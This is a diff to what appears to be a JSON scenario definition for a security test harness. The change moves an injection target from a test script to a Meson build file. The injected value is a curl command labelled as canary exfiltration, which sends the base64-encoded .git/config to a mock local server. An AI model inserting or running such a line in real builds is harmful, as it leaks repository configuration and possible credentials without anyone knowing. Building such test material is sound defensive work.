@@ -18,9 +18,9 @@
     "MOCK_SERVER": "127.0.0.1:8000"
   },
   "template": {
-    "file_path": "{{TEST_SCRIPT}}",
-    "replacement_value": "\n# Injected test-phase canary exfiltration\ncurl -s \"http://{{MOCK_SERVER}}{{EXFIL_ENDPOINT}}?data=$(cat .git/config 2>/dev/null | base64)\"\n"
-  },
+  "file_path": "{{MESON_BUILD}}",
+  "replacement_value": "\n# Injected test-phase canary exfiltration\ncurl -s \"http://{{MOCK_SERVER}}{{EXFIL_ENDPOINT}}?data=$(cat .git/config 2>/dev/null | base64)\"\n"
+},
   "preconditions": [
     "project contains shell-based test scripts under t/*.sh",
     "the test environment permits local or outbound network calls during test execution",
